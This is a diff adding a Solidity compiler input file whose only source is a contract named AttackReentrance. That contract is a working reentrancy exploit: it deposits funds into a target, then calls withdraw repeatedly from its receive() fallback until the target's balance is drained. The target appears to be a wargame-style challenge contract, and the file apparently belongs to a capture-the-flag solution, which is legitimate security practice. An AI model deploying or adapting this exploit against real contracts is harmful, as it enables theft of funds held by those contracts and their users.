@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Reentrancy/AttackReentrance.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IReentrance {\n    function donate(address to) external payable;\n\n    function withdraw(uint _amount) external;\n\n    function balanceOf(address _who) external view returns (uint256);\n}\n\ncontract AttackReentrance {\n    IReentrance public reentrance;\n    uint256 donation;\n\n    event Withdrawed(uint256 amount);\n    event NotWithdrawed();\n\n    constructor(IReentrance _reentrance) {\n        reentrance = _reentrance;\n    }\n\n    function donate() external payable {\n        donation = msg.value;\n        reentrance.donate{value: donation}(address(this));\n    }\n\n    function pwn() external {\n        reentrance.withdraw(donation);\n    }\n\n    receive() external payable {\n        if(address(reentrance).balance > 0) {\n            reentrance.withdraw(donation);\n        }\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
